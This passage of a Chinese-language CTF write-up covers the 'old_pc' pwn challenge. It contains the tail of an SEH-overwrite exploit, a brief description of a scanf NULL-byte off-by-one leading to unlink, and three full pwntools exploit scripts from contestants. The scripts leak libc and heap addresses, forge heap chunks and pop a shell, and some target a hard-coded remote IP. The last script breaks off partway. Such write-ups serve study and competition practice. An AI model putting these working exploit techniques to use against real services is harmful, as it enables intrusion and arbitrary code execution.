class="number">0xd8fbf0</span> - <span class="number">0x0D8FB24</span>)</span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p32(<span class="number">0xFFFFFFE4</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0xFFFFFF0C</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">payload += p32(main_addr - <span class="number">0x1bd</span>)</span><br><span class="line">payload += p32(main_addr - <span class="number">0x17a</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;C&quot;</span>)</span><br><span class="line">payload += <span class="string">&quot;H&quot;</span>*<span class="number">0x8</span></span><br><span class="line">payload += p32(GS_cookie)</span><br><span class="line">payload += p32(main_addr - <span class="number">0x17a</span>) <span class="comment"># &quot;C&quot;*0x4</span></span><br><span class="line">payload += <span class="string">&quot;C&quot;</span>*<span class="number">0x4</span> <span class="comment"># p32(main_addr - 0x175)</span></span><br><span class="line">payload += p32(next_SEH)</span><br><span class="line">payload += p32(this_SEH_ptr)</span><br><span class="line">payload += p32((buffer_start + <span class="number">8</span>)^security_cookie)</span><br><span class="line"><span class="comment"># payload += p32(Scope_Table)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Do you want to know more?\r\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">p.sendline(<span class="string">&quot;AA&quot;</span>)</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3><span id="old-pc">old_pc</span><a href="#old-pc" class="header-anchor"></a></h3><p>scanf导致的NULL-byte offbyone -&gt; 32位unlink -&gt; 想怎么打就怎么打（各位大哥对不起，下次一定提前提示libc版本号）</p>
<ul>
<li>预期解是 unlink+house_of_spirit，没想到还有人被realloc卡住了[狗头]。</li>
<li>目前见过最骚的非预期是kirin师傅的house_of_prime做法和7o8v师傅的house_of_orange做法。</li>
</ul>
<h6><span id="exp-from-ren-ren-ren">exp from 人人人</span><a href="#exp-from-ren-ren-ren" class="header-anchor"></a></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">binary = ELF(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">	<span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">	io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">	io = remote(<span class="string">&#x27;47.111.59.243&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	info(<span class="string">&quot;INVALID OP&quot;</span>)</span><br><span class="line">	exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">c</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(c))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">size,name,price</span>):</span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Name: &quot;</span>,name)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Price: &quot;</span>,<span class="built_in">str</span>(price))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c</span>(<span class="params">index,comment,score</span>):</span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	io.sendafter(<span class="string">&quot;: &quot;</span>,comment)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;score: &quot;</span>,<span class="built_in">str</span>(score))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">index</span>):</span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">index,new,c,data = <span class="string">&#x27;&#x27;</span>,fill = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	choice(<span class="number">4</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	sleep(<span class="number">0.2</span>)</span><br><span class="line">	io.send(new)</span><br><span class="line">	<span class="keyword">if</span>(index&lt;=<span class="number">3</span>):</span><br><span class="line">		io.sendlineafter(<span class="string">&quot;(y/n)&quot;</span>,c)</span><br><span class="line">		<span class="keyword">if</span>(c == <span class="string">&#x27;y&#x27;</span>):</span><br><span class="line">			io.sendlineafter(<span class="string">&quot;serial: &quot;</span>,data)</span><br><span class="line">			io.sendafter(<span class="string">&quot;Pwner\n&quot;</span>,fill)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;c&#x27;)</span></span><br><span class="line"></span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;0000&#x27;</span>,<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">c(<span class="number">0</span>,<span class="string">&#x27;0000&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;0000&#x27;</span>,<span class="number">0</span>)<span class="comment">#1</span></span><br><span class="line">c(<span class="number">1</span>,<span class="string">&#x27;0000&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;0000&#x27;</span>,<span class="number">0</span>)<span class="comment">#2</span></span><br><span class="line">c(<span class="number">2</span>,<span class="string">&#x27;0000&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">t(<span class="number">0</span>);t(<span class="number">1</span>);</span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;0000&#x27;</span>,<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">c(<span class="number">0</span>,<span class="string">&#x27;0&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;0000&#x27;</span>,<span class="number">0</span>)<span class="comment">#1</span></span><br><span class="line">c(<span class="number">1</span>,<span class="string">&#x27;0&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">t(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Comment &#x27;</span>)</span><br><span class="line">buf = io.recv(<span class="number">4</span>)</span><br><span class="line">libc_base = u32(buf)-(<span class="number">0xf7736730</span>-<span class="number">0xf7584000</span>)+<span class="number">0x2000</span></span><br><span class="line">success(<span class="string">&quot;libc base -&gt; %#x&quot;</span>%libc_base)</span><br><span class="line">buf = io.recv(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(u32(buf))</span><br><span class="line">heap_base = ((u32(buf)&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>)</span><br><span class="line">success(<span class="string">&quot;heap base -&gt; %#x&quot;</span>%heap_base)</span><br><span class="line"></span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh;\x00&#x27;</span>,<span class="number">1</span>)<span class="comment">#0</span></span><br><span class="line">c(<span class="number">0</span>,p32(heap_base+<span class="number">0x338</span>)*<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;1111&#x27;</span>,<span class="number">1</span>)<span class="comment">#3</span></span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;1111&#x27;</span>,<span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;1111&#x27;</span>,<span class="number">1</span>)<span class="comment">#5</span></span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&#x27;1111&#x27;</span>,<span class="number">1</span>)<span class="comment">#6</span></span><br><span class="line">t(<span class="number">3</span>);t(<span class="number">4</span>);t(<span class="number">5</span>);t(<span class="number">6</span>);</span><br><span class="line">p(<span class="number">0x6c</span>,<span class="string">&#x27;2222&#x27;</span>,<span class="number">2</span>)<span class="comment">#3</span></span><br><span class="line">p(<span class="number">0xf8</span>,<span class="string">&#x27;2222&#x27;</span>,<span class="number">2</span>)<span class="comment">#4</span></span><br><span class="line">p(<span class="number">0x10</span>,<span class="string">&quot;$0;\x00&quot;</span>+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0x1c1</span>),<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">c(<span class="number">5</span>,p32(<span class="number">0</span>)*<span class="number">5</span>+p32(<span class="number">0x11</span>)+<span class="number">3</span>*p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+<span class="number">3</span>*p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>),<span class="number">2</span>)</span><br><span class="line">t(<span class="number">3</span>)</span><br><span class="line">p(<span class="number">0x6c</span>,p32(<span class="number">0</span>)+p32(<span class="number">0x69</span>)+p32(heap_base+<span class="number">0x30c</span>-<span class="number">0xc</span>)+p32(heap_base+<span class="number">0x30c</span>-<span class="number">0x8</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x58</span>+p32(<span class="number">0x68</span>),<span class="number">0x19</span>)<span class="comment">#3</span></span><br><span class="line">t(<span class="number">4</span>)</span><br><span class="line">r(<span class="number">3</span>,p32(<span class="number">0</span>)+p32(<span class="number">0x19</span>)+p32(<span class="number">0</span>)+p32(libc_base+<span class="number">0x1b18b0</span>),<span class="string">&#x27;y&#x27;</span>,data = <span class="string">&#x27;e4SyD1C!&#x27;</span>,fill = p32(libc_base+<span class="number">0x3a940</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h6><span id="exp-from-kirin">exp from Kirin</span><a href="#exp-from-kirin" class="header-anchor"></a></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">l,note,prize</span>):</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>) </span><br><span class="line">  p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(l))</span><br><span class="line">  p.sendafter(<span class="string">&quot;: &quot;</span>,note)</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(prize))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comment</span>(<span class="params">index,note,score</span>):</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>) </span><br><span class="line">  p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  p.sendafter(<span class="string">&quot;: &quot;</span>,note)</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(score))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>) </span><br><span class="line">  p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Comment &quot;</span>)</span><br><span class="line">  s=p.recvuntil(<span class="string">&quot;1.&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,note,power=<span class="number">0</span>,serial=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>) </span><br><span class="line">  p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  p.send(note)</span><br><span class="line">  <span class="keyword">if</span> power:</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;)&quot;</span>,<span class="string">&quot;y&quot;</span>)</span><br><span class="line">     p.sendafter(<span class="string">&quot;serial: &quot;</span>,serial)</span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">     p.sendlineafter(<span class="string">&quot;)&quot;</span>,<span class="string">&quot;n&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./pwn&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.111.59.243&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x13</span>+<span class="string">&quot;\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="string">&quot;bbbb&quot;</span>,<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">&quot;cccc\n&quot;</span>,<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">1</span>,<span class="string">&quot;b&quot;</span>,<span class="number">12</span>)</span><br><span class="line">libc_addr=u32(delete(<span class="number">1</span>)[<span class="number">0</span>:<span class="number">4</span>])+<span class="number">0xf7dfa000</span>-<span class="number">0xf7fac762</span>+<span class="number">0x2000</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">&quot;aaaaaa\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">&quot;ddddddd\n&quot;</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">&quot;eeee\n&quot;</span>,<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x14</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">  add(<span class="number">0x14</span>,<span class="string">&quot;a&quot;</span>*(<span class="number">0x14</span>-i-<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">  delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+<span class="string">&quot;\xa8&quot;</span>+<span class="string">&quot;\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x24</span>,<span class="string">&quot;aaaaaa\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">2</span>,<span class="string">&quot;2&quot;</span>*<span class="number">84</span>,<span class="number">0</span>)</span><br><span class="line">s=delete(<span class="number">2</span>)</span><br><span class="line">heap_addr=u32(s[<span class="number">84</span>:<span class="number">84</span>+<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">&quot;a\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>*<span class="number">72</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x19</span>)+p32(heap_addr++<span class="number">0x2c8</span>)+p32(heap_addr)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x91</span>),<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">2</span>,p32(<span class="number">0</span>)*<span class="number">24</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x19</span>)+<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x19</span>),<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">&quot;a\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">&quot;a\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">&quot;a\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">&quot;a\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">comment(<span class="number">3</span>,p32(<span class="number">0</span>)*<span class="number">9</span>+p32(<span class="number">0x91</span>)+p32(libc_addr-<span class="number">0xf7e1f000</span>+<span class="number">0xf7fcf7b0</span>)+p32(libc_addr+<span class="number">0x1b18e0</span>-<span class="number">0x8</span>),<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">4</span>,<span class="string">&quot;4444&quot;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">&quot;a\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,p32(heap_addr+<span class="number">0x2e0</span>)+p32(heap_addr+<span class="number">0x1d8</span>)+<span class="string">&quot;\n&quot;</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0xec</span>,p32(libc_addr+<span class="number">0xf7fcf743</span>+<span class="number">8</span>-<span class="number">0xf7e1f000</span>)+<span class="string">&quot;\n&quot;</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xec</span>,p32(libc_addr+<span class="number">0xf7fcf743</span>+<span class="number">8</span>-<span class="number">0xf7e1f000</span>)+<span class="string">&quot;\n&quot;</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">&quot;/bin/sh\n&quot;</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">&quot;a&quot;</span>*<span class="number">17</span>+p32(libc_addr+<span class="number">0x3a940</span>)+<span class="string">&quot;\n&quot;</span>,<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6><span id="exp-from-7o8v">exp from 7o8v</span><a href="#exp-from-7o8v" class="header-anchor"></a></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(</span><br><span class="line">    log_level=<span class="string">&#x27;debug&#x27;</span>,</span><br><span class="line">    os=<span class="string">&#x27;linux&#x27;</span>,</span><br><span class="line">    arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">    binary=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">e = context.binary</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;47.111.59.243&#x27;</span> </span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">io = process()</span><br><span class="line"><span class="comment">#io = remote(ip, port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#====================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sh</span>():</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">purchase</span>(<span class="params">length, name, price=<span class="number">0</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;length: &#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Name: &#x27;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;ce: &#x27;</span>, <span class="built_in">str</span>(price))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comment</span>(<span class="params">idx, content, score</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;dex: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&#x27; : &#x27;</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(score))</span><br><span 